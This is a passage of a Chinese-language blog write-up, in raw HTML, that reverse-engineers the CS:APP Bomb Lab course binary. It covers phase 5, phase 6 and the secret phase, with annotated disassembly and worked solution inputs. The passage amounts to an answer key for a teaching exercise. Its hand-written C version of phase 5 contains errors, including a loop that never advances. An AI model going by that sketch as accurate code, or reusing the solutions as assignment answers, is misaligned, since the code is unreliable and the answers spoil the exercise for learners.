%fs:0x28,%rax</span><br><span class="line">0x00000000004010e7 &lt;+133&gt;:je     0x4010ee &lt;phase_5+140&gt;</span><br><span class="line">0x00000000004010e9 &lt;+135&gt;:callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">0x00000000004010ee &lt;+140&gt;:add    $0x20,%rsp</span><br></pre></td></tr></table></figure><p>最后只是检查一下有没有栈溢出，也就是字符不能占据<code>rsp+0x18</code>及其以上的空间。</p><h2 id="拼凑起来"><a href="#拼凑起来" class="headerlink" title="拼凑起来"></a>拼凑起来</h2><p>总的来说就是取这六个字符的低4位，最后零拓展为8位保存并根据这个值作为偏移量来计算内存地址。为了相等需要以下的偏移：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">选取的是可打印字符，只要选取字符十六进制最后4位是如下的值就可以。</span><br><span class="line">0x9--&gt;)</span><br><span class="line">0xf--&gt;/</span><br><span class="line">0xe--&gt;.</span><br><span class="line">0x5--&gt;%</span><br><span class="line">0x6--&gt;&amp;</span><br><span class="line">0x7--&gt;&#x27;</span><br></pre></td></tr></table></figure><p>可以使用<code>man ascii</code>命令查看字符对应的编码。</p><h2 id="C语言形式"><a href="#C语言形式" class="headerlink" title="C语言形式"></a>C语言形式</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *t = <span class="string">&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span></span><br><span class="line"><span class="keyword">void</span> phase_5(<span class="keyword">char</span> *s)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">char</span> *p = s;</span><br><span class="line">   <span class="keyword">char</span> r[<span class="number">6</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">strlen</span>(s) != <span class="number">6</span>)</span><br><span class="line">      exploded_bomb();</span><br><span class="line">   <span class="keyword">char</span> *tmp = <span class="string">&quot;flyers&quot;</span>;</span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">while</span> (!p)</span><br><span class="line">   &#123;</span><br><span class="line">      r[i] = t[(*p) &amp; <span class="number">0xf</span>]</span><br><span class="line">      i++;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">strcmp</span>(r, tmp))</span><br><span class="line">      exploded_bomb();</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h1><p>第六关的代码量还是比较大的，我们分块来分析一下。</p><h2 id="第一部分-2"><a href="#第一部分-2" class="headerlink" title="第一部分"></a>第一部分</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004010f4 &lt;+0&gt;:push   %r14</span><br><span class="line">0x00000000004010f6 &lt;+2&gt;:push   %r13</span><br><span class="line">0x00000000004010f8 &lt;+4&gt;:push   %r12</span><br><span class="line">0x00000000004010fa &lt;+6&gt;:push   %rbp</span><br><span class="line">0x00000000004010fb &lt;+7&gt;:push   %rbx</span><br><span class="line">0x00000000004010fc &lt;+8&gt;:sub    $0x50,%rsp</span><br><span class="line">0x0000000000401100 &lt;+12&gt;:mov    %rsp,%r13</span><br><span class="line">0x0000000000401103 &lt;+15&gt;:mov    %rsp,%rsi</span><br><span class="line">0x0000000000401106 &lt;+18&gt;:callq  0x40145c &lt;read_six_numbers&gt;</span><br></pre></td></tr></table></figure><p>首先读取了六个数，<code>rdi</code>存放输入的六个字符，<code>rsi</code>存放栈顶地址，之后调用<code>read_six_numbers</code>将这六个数存到栈上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040110b &lt;+23&gt;:mov    %rsp,%r14</span><br><span class="line">0x000000000040110e &lt;+26&gt;:mov    $0x0,%r12d</span><br><span class="line">0x0000000000401114 &lt;+32&gt;:mov    %r13,%rbp</span><br><span class="line">0x0000000000401117 &lt;+35&gt;:mov    0x0(%r13),%eax</span><br><span class="line">0x000000000040111b &lt;+39&gt;:sub    $0x1,%eax</span><br><span class="line">0x000000000040111e &lt;+42&gt;:cmp    $0x5,%eax</span><br><span class="line">0x0000000000401121 &lt;+45&gt;:jbe    0x401128 &lt;phase_6+52&gt;</span><br><span class="line">0x0000000000401123 &lt;+47&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure><p>该部分主要进行了以下几个操作：</p><ol><li>栈顶地址传入r14</li><li>r13传入rbp，也就是栈顶地址</li><li>第一个参数减1后传入eax</li></ol><p>正确的流程是进行跳转，也就是eax=0x5，那么第一个输入的参数应该是6。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401128 &lt;+52&gt;:add    $0x1,%r12d</span><br><span class="line">0x000000000040112c &lt;+56&gt;:cmp    $0x6,%r12d</span><br><span class="line">0x0000000000401130 &lt;+60&gt;:je     0x401153 &lt;phase_6+95&gt;</span><br></pre></td></tr></table></figure><p>在这里开始就出现了两个分支，r12d初始值为0，这里先加1然后与6进行了比较，那么前5次肯定是进入了分支1</p><h2 id="分支1"><a href="#分支1" class="headerlink" title="分支1"></a>分支1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401132 &lt;+62&gt;:mov    %r12d,%ebx</span><br><span class="line">0x0000000000401135 &lt;+65&gt;:movslq %ebx,%rax</span><br><span class="line">0x0000000000401138 &lt;+68&gt;:mov    (%rsp,%rax,4),%eax</span><br><span class="line">0x000000000040113b &lt;+71&gt;:cmp    %eax,0x0(%rbp)</span><br><span class="line">0x000000000040113e &lt;+74&gt;:jne    0x401145 &lt;phase_6+81&gt;</span><br><span class="line">0x0000000000401140 &lt;+76&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure><p>将r12d中的值符号拓展为8字节(r12d的值是不断变化的)，然后取<code>rsp+4*rax</code>（rax第一次值为<strong>1</strong>）内存处的值，可以想象将6个数存入数组中，rax为数组的索引。之后与rbp（栈顶）地址处的字符比较，也就是第一个字符，两者必须要不相等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401135 &lt;+65&gt;:movslq %ebx,%rax</span><br><span class="line">0x0000000000401138 &lt;+68&gt;:mov    (%rsp,%rax,4),%eax</span><br><span class="line">0x000000000040113b &lt;+71&gt;:cmp    %eax,0x0(%rbp)</span><br><span class="line">0x000000000040113e &lt;+74&gt;:jne    0x401145 &lt;phase_6+81&gt;</span><br><span class="line">0x0000000000401140 &lt;+76&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x0000000000401145 &lt;+81&gt;:add    $0x1,%ebx</span><br><span class="line">0x0000000000401148 &lt;+84&gt;:cmp    $0x5,%ebx</span><br><span class="line">0x000000000040114b &lt;+87&gt;:jle    0x401135 &lt;phase_6+65&gt;</span><br></pre></td></tr></table></figure><p>之后先跳转到<code>0x401145</code>，<code>ebx+1</code>代表数组的索引增加1，等于6时跳出循环，也就是数组遍历完后5个元素，然后结束。<br>整个过程所做的也就是后5个元素与第1个元素比较，两者必须不相等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040114d &lt;+89&gt;:add    $0x4,%r13</span><br><span class="line">0x0000000000401151 &lt;+93&gt;:jmp    0x401114 &lt;phase_6+32&gt;</span><br></pre></td></tr></table></figure><p>之后以第2个元素为起点继续重复上面的步骤，直到第6个元素与第5个元素比较完。<br>那么总的来说分支1就是判断6个数互不相等，并且6个元素小于等于6。</p><h2 id="分支2"><a href="#分支2" class="headerlink" title="分支2"></a>分支2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401153 &lt;+95&gt;:lea    0x18(%rsp),%rsi</span><br><span class="line">0x0000000000401158 &lt;+100&gt;:mov    %r14,%rax</span><br><span class="line">0x000000000040115b &lt;+103&gt;:mov    $0x7,%ecx</span><br><span class="line">0x0000000000401160 &lt;+108&gt;:mov    %ecx,%edx</span><br><span class="line">0x0000000000401162 &lt;+110&gt;:sub    (%rax),%edx</span><br><span class="line">0x0000000000401164 &lt;+112&gt;:mov    %edx,(%rax)</span><br><span class="line">0x0000000000401166 &lt;+114&gt;:add    $0x4,%rax</span><br><span class="line">0x000000000040116a &lt;+118&gt;:cmp    %rsi,%rax</span><br><span class="line">0x000000000040116d &lt;+121&gt;:jne    0x401160 &lt;phase_6+108&gt;</span><br><span class="line">0x000000000040116f &lt;+123&gt;:mov    $0x0,%esi</span><br><span class="line">0x0000000000401174 &lt;+128&gt;:jmp    0x401197 &lt;phase_6+163&gt;</span><br></pre></td></tr></table></figure><p>最后一个参数后面的地址存入<code>rsi</code>，<code>r14</code>存储着栈顶地址。该操作是用<strong>7减去栈顶值并替换掉栈中原来的值</strong>，其它6个元素也是被7减然后替换，取值单位是4字节大小。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401197 &lt;+163&gt;:mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">0x000000000040119a &lt;+166&gt;:cmp    $0x1,%ecx</span><br><span class="line">0x000000000040119d &lt;+169&gt;:jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">0x000000000040119f &lt;+171&gt;:mov    $0x1,%eax</span><br><span class="line">0x00000000004011a4 &lt;+176&gt;:mov    $0x6032d0,%edx</span><br><span class="line">0x00000000004011a9 &lt;+181&gt;:jmp    0x401176 &lt;phase_6+130&gt;</span><br></pre></td></tr></table></figure><p><code>rsi</code>此时值为0，<code>rsp+rsi</code>处的值小于等于1(<code>rsi</code>是变化的)，否则eax=1，edx赋值为0x6032d0并进行循环。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401183 &lt;+143&gt;:mov    $0x6032d0,%edx</span><br><span class="line">0x0000000000401188 &lt;+148&gt;:mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">0x000000000040118d &lt;+153&gt;:add    $0x4,%rsi</span><br><span class="line">0x0000000000401191 &lt;+157&gt;:cmp    $0x18,%rsi</span><br><span class="line">0x0000000000401195 &lt;+161&gt;:je     0x4011ab &lt;phase_6+183&gt;</span><br><span class="line">0x0000000000401197 &lt;+163&gt;:mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">相同操作</span><br><span class="line">0x000000000040119a &lt;+166&gt;:cmp    $0x1,%ecx</span><br><span class="line">0x000000000040119d &lt;+169&gt;:jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">0x000000000040119f &lt;+171&gt;:mov    $0x1,%eax  </span><br><span class="line">0x00000000004011a4 &lt;+176&gt;:mov    $0x6032d0,%edx </span><br><span class="line">0x00000000004011a9 &lt;+181&gt;:jmp    0x401176 &lt;phase_6+130&gt;</span><br></pre></td></tr></table></figure><p><code>0x6032d0+offset</code>地址存入<code>rsp+2*rsi+0x20</code>，一共进行6次。因为<code>rsi</code>是以4字节为单位进行增加并且倍数为2，那么这里就是存入8字节单位的数据，正好循环6次。每个参数的值小于等于1否则执行下面的操作。这里面存入的<code>rdx</code>值是可以变化的，见下面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401176 &lt;+130&gt;:mov    0x8(%rdx),%rdx</span><br><span class="line">0x000000000040117a &lt;+134&gt;:add    $0x1,%eax</span><br><span class="line">0x000000000040117d &lt;+137&gt;:cmp    %ecx,%eax</span><br><span class="line">0x000000000040117f &lt;+139&gt;:jne    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">0x0000000000401181 &lt;+141&gt;:jmp    0x401188 &lt;phase_6+148&gt;</span><br></pre></td></tr></table></figure><p><code>(rdx)+0x8</code>存入rdx，eax+1(eax每次的初始值均为1)直到与ecx(因为间隔太长所以容易糊涂，记清楚这个是我们栈上存入的参数)相等。</p><p>那么就很清楚了，根据我们存在栈上的参数作为偏移索引（偏移单位为8位），以<code>0x6032d0</code>地址处的值作为基址。<br>将计算出来的地址处的<strong>值</strong>存入以<code>rsp+0x20</code>开始的栈地址，每个地址为64位。</p><p>要严格控制好索引，因为有的地方存储的不是地址。</p><p><strong>注意这个叠加的方法，是那个单元所存储的地址值加8，而不是这个单元的地址。</strong><br><img src="https://s2.loli.net/2022/04/15/MrubCpgXVNyW7Af.png" alt="image.png"><br>x为循环次数与我们输入的参数有关，每次循环取地址加<code>0x8</code>处的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004011ab &lt;+183&gt;:mov    0x20(%rsp),%rbx</span><br><span class="line">0x00000000004011b0 &lt;+188&gt;:lea    0x28(%rsp),%rax</span><br><span class="line">0x00000000004011b5 &lt;+193&gt;:lea    0x50(%rsp),%rsi</span><br><span class="line">0x00000000004011ba &lt;+198&gt;:mov    %rbx,%rcx</span><br><span class="line">0x00000000004011bd &lt;+201&gt;:mov    (%rax),%rdx</span><br><span class="line">0x00000000004011c0 &lt;+204&gt;:mov    %rdx,0x8(%rcx)</span><br><span class="line">0x00000000004011c4 &lt;+208&gt;:add    $0x8,%rax</span><br><span class="line">0x00000000004011c8 &lt;+212&gt;:cmp    %rsi,%rax</span><br><span class="line">0x00000000004011cb &lt;+215&gt;:je     0x4011d2 &lt;phase_6+222&gt;</span><br><span class="line">0x00000000004011cd &lt;+217&gt;:mov    %rdx,%rcx</span><br><span class="line">0x00000000004011d0 &lt;+220&gt;:jmp    0x4011bd &lt;phase_6+201&gt;</span><br></pre></td></tr></table></figure><p>因为存入的是8字节大小的数，所以要以8字节为单位取值(8字节正是x86-64机器下地址的大小)，<code>rsp+0x20</code>为第一次添加的值，<code>rax</code>内为第2次添加值的地址，<code>rsi</code>存储第7个添加值的地址同样的作为结束条件，根据rax进行迭代。<br><code>rbx ,rcx= (rsp+0x20)</code>(第一个添加的值)<br><code>rax=rsp+0x28</code>(所添加第二个参数的地址)<br><code>rsi=rsp+0x50</code>(结束条件)</p><blockquote><p>循环体<br>rdx=(rax)<br>(rcx)+0x8=rdx<br>rcx=rdx<br>rdx=(rax+0x8)</p></blockquote><p>将存入的第二个地址赋值给第一个地址所存储的地址偏移0x8处，以此类推。<br><strong>也就是1指向2，2指向3以此类推</strong><br>条件<br>开始赋值地址：rsp+0x28<br>从新第二个元素开始，以元素内值+0x8为地址将其赋值为下一个元素内的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004011d2 &lt;+222&gt;:movq   $0x0,0x8(%rdx)</span><br><span class="line">0x00000000004011da &lt;+230&gt;:mov    $0x5,%ebp</span><br><span class="line">0x00000000004011df &lt;+235&gt;:mov    0x8(%rbx),%rax</span><br><span class="line">0x00000000004011e3 &lt;+239&gt;:mov    (%rax),%eax</span><br><span class="line">0x00000000004011e5 &lt;+241&gt;:cmp    %eax,(%rbx)</span><br><span class="line">0x00000000004011e7 &lt;+243&gt;:jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">0x00000000004011e9 &lt;+245&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x00000000004011ee &lt;+250&gt;:mov    0x8(%rbx),%rbx</span><br><span class="line">0x00000000004011f2 &lt;+254&gt;:sub    $0x1,%ebp</span><br><span class="line">0x00000000004011f5 &lt;+257&gt;:jne    0x4011df &lt;phase_6+235&gt;</span><br><span class="line">0x00000000004011f7 &lt;+259&gt;:add    $0x50,%rsp</span><br></pre></td></tr></table></figure><p>第一行赋值是将最后一个单元存储的地址赋为0，也就是null。<br><img src="https://s2.loli.net/2022/04/06/VJwpFY3LtdOx7Es.png" alt="image.png"><br>详细的结构见下图：<br><img src="https://s2.loli.net/2022/04/15/XYIF5jr28G6O1KD.png" alt="image.png"><br>rdx=(rsp+0x48)最后一个单元开始地址<br>2. rbx=(rsp+0x20)第一个单元开始地址<br>rax=(rsp+0x20)+0x8 第二个单元开始地址<br>eax=(rax) 第二个单元前4个字节<br>(rbx)&gt;=eax  第一个单元存储的数大于等于第二单元存储的数（有符号比较）<br>ebp=0x5<br>rbx=(rbx+0x8) 第二个单元地址，从第二个开始重复5次。<strong>注意这里地址的计算</strong>，是根据结点中存储的地址寻找下一个相邻的结点。<br>也就是该链表所存储的值应该是从左向右递减的一个序列。<br>跳转的条件码是根据上一步sub操作而决定的，具体见书籍P136页。<br>存储的数值如上图，我们只需要排列一下就可以，注意比较大小时只取前4个字节，并且索引单位为0x8，起始偏移为0x6032d0(因为第一个数必须为6，偏移索引为7-6=1)并且存储的是地址，我们赋值到栈上的也是其地址。<br>注意存储的是起始地址，并且<strong>7减去传入的参数才是真实的</strong>。<br>正确的一个序列：</p><ol><li>4 (实际上就加了2次) 7 - 3 真实单元3</li><li>3 （7 - 4）4</li><li>2 5 </li><li>1 6</li><li>6 1</li><li>5 2</li></ol><p><img src="https://s2.loli.net/2022/04/06/vjwIGSNfRAkc2Eq.png" alt="image.png"><br>存储在栈上的索引。<br><img src="https://s2.loli.net/2022/04/06/UABWLCRlX7yZnSu.png" alt="image.png"><br>每前8个字节存储数值，后8个字节存储地址。</p><h1 id="秘密关卡"><a href="#秘密关卡" class="headerlink" title="秘密关卡"></a>秘密关卡</h1><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401242 &lt;+0&gt;:push   %rbx</span><br><span class="line">0x0000000000401243 &lt;+1&gt;:callq  0x40149e &lt;read_line&gt;</span><br><span class="line">0x0000000000401248 &lt;+6&gt;:mov    $0xa,%edx</span><br><span class="line">0x000000000040124d &lt;+11&gt;:mov    $0x0,%esi</span><br><span class="line">0x0000000000401252 &lt;+16&gt;:mov    %rax,%rdi</span><br><span class="line">0x0000000000401255 &lt;+19&gt;:callq  0x400bd0 &lt;strtol@plt&gt;</span><br><span class="line">0x000000000040125a &lt;+24&gt;:mov    %rax,%rbx</span><br><span class="line">0x000000000040125d &lt;+27&gt;:lea    -0x1(%rax),%eax</span><br><span class="line">0x0000000000401260 &lt;+30&gt;:cmp    $0x3e8,%eax</span><br><span class="line">0x0000000000401265 &lt;+35&gt;:jbe    0x40126c &lt;secret_phase+42&gt;</span><br><span class="line">0x0000000000401267 &lt;+37&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x000000000040126c &lt;+42&gt;:mov    %ebx,%esi</span><br><span class="line">0x000000000040126e &lt;+44&gt;:mov    $0x6030f0,%edi</span><br><span class="line">0x0000000000401273 &lt;+49&gt;:callq  0x401204 &lt;fun7&gt;</span><br><span class="line">0x0000000000401278 &lt;+54&gt;:cmp    $0x2,%eax</span><br><span class="line">0x000000000040127b &lt;+57&gt;:je     0x401282 &lt;secret_phase+64&gt;</span><br><span class="line">0x000000000040127d &lt;+59&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x0000000000401282 &lt;+64&gt;:mov    $0x402438,%edi</span><br><span class="line">0x0000000000401287 &lt;+69&gt;:callq  0x400b10 &lt;puts@plt&gt;</span><br><span class="line">0x000000000040128c &lt;+74&gt;:callq  0x4015c4 &lt;phase_defused&gt;</span><br><span class="line">0x0000000000401291 &lt;+79&gt;:pop    %rbx</span><br><span class="line">0x0000000000401292 &lt;+80&gt;:retq  </span><br></pre></td></tr></table></figure><p>strtol(“”, 0, 10)根据十进制规则转换字符串。<br>大致流程：输入的值减1（rax值）后小于等于0x3e8(无符号比较)，0x6030f0作为第一个参数（存储的值为36），我们输入的值作为第二个参数(注意传入的是原值，而不是进行减法后的值)传入func7。函数的返回值必须为2。</p><h2 id="func7"><a href="#func7" class="headerlink" title="func7"></a>func7</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401204 &lt;+0&gt;:sub    $0x8,%rsp</span><br><span class="line">0x0000000000401208 &lt;+4&gt;:test   %rdi,%rdi</span><br><span class="line">0x000000000040120b &lt;+7&gt;:je     0x401238 &lt;fun7+52&gt;</span><br><span class="line">0x000000000040120d &lt;+9&gt;:mov    (%rdi),%edx</span><br><span class="line">0x000000000040120f &lt;+11&gt;:cmp    %esi,%edx</span><br><span class="line">0x0000000000401211 &lt;+13&gt;:jle    0x401220 &lt;fun7+28&gt;</span><br><span class="line">0x0000000000401213 &lt;+15&gt;:mov    0x8(%rdi),%rdi</span><br><span class="line">0x0000000000401217 &lt;+19&gt;:callq  0x401204 &lt;fun7&gt;</span><br><span class="line">0x000000000040121c &lt;+24&gt;:add    %eax,%eax</span><br><span class="line">0x000000000040121e &lt;+26&gt;:jmp    0x40123d &lt;fun7+57&gt;</span><br><span class="line">0x0000000000401220 &lt;+28&gt;:mov    $0x0,%eax</span><br><span class="line">0x0000000000401225 &lt;+33&gt;:cmp    %esi,%edx</span><br><span class="line">0x0000000000401227 &lt;+35&gt;:je     0x40123d &lt;fun7+57&gt;</span><br><span class="line">0x0000000000401229 &lt;+37&gt;:mov    0x10(%rdi),%rdi</span><br><span class="line">0x000000000040122d &lt;+41&gt;:callq  0x401204 &lt;fun7&gt;</span><br><span class="line">0x0000000000401232 &lt;+46&gt;:lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">0x0000000000401236 &lt;+50&gt;:jmp    0x40123d &lt;fun7+57&gt;</span><br><span class="line">0x0000000000401238 &lt;+52&gt;:mov    $0xffffffff,%eax</span><br><span class="line">0x000000000040123d &lt;+57&gt;:add    $0x8,%rsp</span><br><span class="line">0x0000000000401241 &lt;+61&gt;:retq   </span><br></pre></td></tr></table></figure><p><code>0x6030f0</code>内存处存储的值：<br><img src="https://s2.loli.net/2022/04/06/qUuoNly2gp1jGeE.png" alt="image.png"></p><blockquote><p>(rdi)=36<br>rdi+0x8=6304016<br>rdi+0x10=6304048</p></blockquote><p>该函数就是根据我们输入的值进行判断，然后取存储的不同值进行计算，只有rax为2时算成功，那么我们只需要找到一个可行的序列即可。<br>整个过程改变的是rdi寄存器内存储的地址，比较的是rdi地址处存储的值，进行计算的是rax。<br>rax初始值为我们输入的参数-1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401211 &lt;+13&gt;:jle    0x401220 &lt;fun7+28&gt;</span><br><span class="line">0x0000000000401220 &lt;+28&gt;:mov    $0x0,%eax</span><br><span class="line">0x0000000000401225 &lt;+33&gt;:cmp    %esi,%edx</span><br><span class="line">0x0000000000401227 &lt;+35&gt;:je     0x40123d &lt;fun7+57&gt;</span><br><span class="line">0x0000000000401229 &lt;+37&gt;:mov    0x10(%rdi),%rdi</span><br><span class="line">0x000000000040122d &lt;+41&gt;:callq  0x401204 &lt;fun7&gt;</span><br><span class="line">0x0000000000401232 &lt;+46&gt;:lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">0x0000000000401236 &lt;+50&gt;:jmp    0x40123d &lt;fun7+57&gt;</span><br></pre></td></tr></table></figure><p>大于我们输入的数时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401213 &lt;+15&gt;:mov    0x8(%rdi),%rdi</span><br><span class="line">0x0000000000401217 &lt;+19&gt;:callq  0x401204 &lt;fun7&gt;</span><br><span class="line">0x000000000040121c &lt;+24&gt;:add    %eax,%eax</span><br><span class="line">0x000000000040121e &lt;+26&gt;:jmp    0x40123d &lt;fun7+57&gt;</span><br></pre></td></tr></table></figure><p>我们输入的值只能小于等于<code>1001</code>(十进制)，</p><p>上一张图片输出时采用的是十进制，导致输出的值与自己计算的地址匹配不上，踩了半天坑。。。。。<br>用十六进制输出内容：<br><img src="https://s2.loli.net/2022/04/16/ZcUR2Hazs1dIN9S.png" alt="image.png"><br>4个8字节为一个单元，8字节为一个单位，每个单元里面存储1个数值两个地址，空地址则填充为0。最后的8个全0字节是用来进行地址对齐而存在的。<br>通过分析这块内存，可以总结出它存储的是一个下图的二叉树结构：<br><img src="https://s2.loli.net/2022/04/16/IBlHLcAv6Q4f7dR.png" alt="image.png"><br>观察这个二叉树，我们发现它的数值排序是有规律的，小于根节点处值的都在树的左边，大于根节点的都在树的右边。<br>如果我们输入的数大于内存中的数则选择高位存储的地址(右结点)，小于则选择低位存储的地址(左结点)。之后以该地址继续取下一个值进行下一次比较，并且迭代的是地址。(这个逻辑一定要理清)<br>只要确保最终函数返回值为2就算成功。</p><p>可以推测我们要输入值的范围肯定在这个二叉树里面，当然可以一个一个的测试最终得出结果。<br>但是除了暴力解法，我们可以根据程序逻辑来推测。</p><h2 id="C语言形式讲解"><a href="#C语言形式讲解" class="headerlink" title="C语言形式讲解"></a>C语言形式讲解</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func7</span><span class="params">(<span class="keyword">void</span> *rdi, <span class="keyword">int</span> rsi)</span></span></span><br><span class="line"><span 